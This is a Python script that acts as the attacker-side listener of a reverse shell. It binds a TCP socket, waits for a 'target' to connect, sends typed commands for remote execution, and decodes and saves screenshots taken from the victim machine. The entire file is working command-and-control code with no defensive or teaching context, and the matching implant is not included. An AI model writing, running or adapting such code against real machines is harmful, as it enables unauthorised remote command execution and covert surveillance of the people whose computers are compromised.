import socket
import json
import uuid
import base64

def parse_target_response():
	response = ''
	while True:
		try:
			response += target.recv(1024).decode()
			return json.loads(response)
		except ValueError:
			continue

# 1. CREATE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# 2. BIND
sock.bind(('1.1.1.1', 54321))

# 3. LISTEN
sock.listen(1)

# 4. ACCEPT
target, ip = sock.accept()
print(f'Connection established from {ip}')

# 5. SEND AND RECEIVE
try:
	while True:
		command = input('Type the command to execute remotely: ')
		target.send(json.dumps(command).encode())

		if command == 'quit':
			break

		if len(command.split()) == 2 and command.split()[0] == 'cd':
			continue
		elif len(command.split()) == 1 and command.split()[0] == 'screenshot':
			try:
				id = str(uuid.uuid4())
				filename = id + '.png'

				with open(filename, 'wb') as file:
					png = parse_target_response()
					file.write(base64.b64decode(png))
			except:
				print('There was an error when trying to take the screenshot')
		else:
			response = parse_target_response()
			print(response)
except KeyboardInterrupt:
	print('End of the program')

# 6. CLOSE CONNECTION
sock.close()
